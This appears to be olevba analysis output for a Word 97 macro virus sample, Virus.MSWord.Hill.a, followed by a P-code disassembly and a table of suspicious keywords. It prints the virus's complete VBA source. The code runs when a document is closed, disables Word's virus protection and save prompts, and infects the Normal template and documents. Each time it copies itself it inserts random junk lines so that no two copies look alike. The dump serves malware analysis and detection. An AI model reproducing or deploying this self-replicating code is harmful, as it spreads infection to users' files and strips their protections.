olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Hill.a - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'mountain
Private Sub Document_Close()
Dim j
   On Error Resume Next
   'Macro.Word97.Mountain by Duke/SMF
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   j = 1
   Randomize
   If NT.Lines(1, 1) <> "'mountain" Then
      For i = 1 To AD.CountOfLines
         NT.InsertLines j, AD.Lines(i, 1)
         j = j + 1
         Ex = Mid(AD.Lines(i, 1), 1, 1)
         If Ex = Asc(" ") Then MountainNT
      Next
   End If
   If AD.Lines(1, 1) <> "'mountain" Then
      For i = 1 To NT.CountOfLines
         AD.InsertLines i, NT.Lines(i, 1)
         j = j + 1
         Ex = Mid(NT.Lines(i, 1), 1, 1)
         If Ex = Asc(" ") Then MountainAD
      Next
   End If
End Sub
Function MountainNT()
   R = Rnd
   If R < 1 And R > 0.08 Then
      NT.InsertLines j, " S = " + Chr(34) + Gener + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      NT.InsertLines j, " '" + Gener
   End If
   If R < 0.05 And R > 0.03 Then
      NT.InsertLines j, "  "
   End If
   If R > 0.03 Then j = j + 1
End Function
Function MountainAD()
   R = Rnd
   If R < 1 And R > 0.08 Then
      AD.InsertLines j, " S = " + Chr(34) + Gener + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      AD.InsertLines j, " '" + Gener
   End If
   If R < 0.05 And R > 0.03 Then
      AD.InsertLines j, "  "
   End If
   If R > 0.03 Then j = j + 1
End Function
Function Gener()
   Gener = ""
   For i = 1 To Int(20 * Rnd + 1)
      Gener = Gener + Chr(Int(128 * Rnd + 48))
   Next
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hill.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/NewMacros - 9025 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 "mountain"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	Dim 
' 	VarDefn j
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	QuoteRem 0x0003 0x0021 "Macro.Word97.Mountain by Duke/SMF"
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitDI2 0x0001 
' 	St j 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'mountain"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	For 
' Line #14:
' 	Ld j 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #15:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Ex 
' Line #17:
' 	Ld Ex 
' 	LitStr 0x0001 " "
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MountainNT 0x0000 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Next 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'mountain"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	For 
' Line #22:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #24:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Ex 
' Line #25:
' 	Ld Ex 
' 	LitStr 0x0001 " "
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MountainAD 0x0000 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Function MountainNT())
' Line #30:
' 	Ld Rnd 
' 	St R 
' Line #31:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #32:
' 	Ld j 
' 	LitStr 0x0005 " S = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Gener 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Lt 
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #35:
' 	Ld j 
' 	LitStr 0x0002 " '"
' 	Ld Gener 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #38:
' 	Ld j 
' 	LitStr 0x0002 "  "
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	EndIf 
' Line #41:
' 	EndFunc 
' Line #42:
' 	FuncDefn (Function MountainAD())
' Line #43:
' 	Ld Rnd 
' 	St R 
' Line #44:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #45:
' 	Ld j 
' 	LitStr 0x0005 " S = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Gener 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Lt 
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #48:
' 	Ld j 
' 	LitStr 0x0002 " '"
' 	Ld Gener 
' 	Add 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld j 
' 	LitStr 0x0002 "  "
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	EndIf 
' Line #54:
' 	EndFunc 
' Line #55:
' 	FuncDefn (Function Gener())
' Line #56:
' 	LitStr 0x0000 ""
' 	St Gener 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #58:
' 	Ld Gener 
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Gener 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

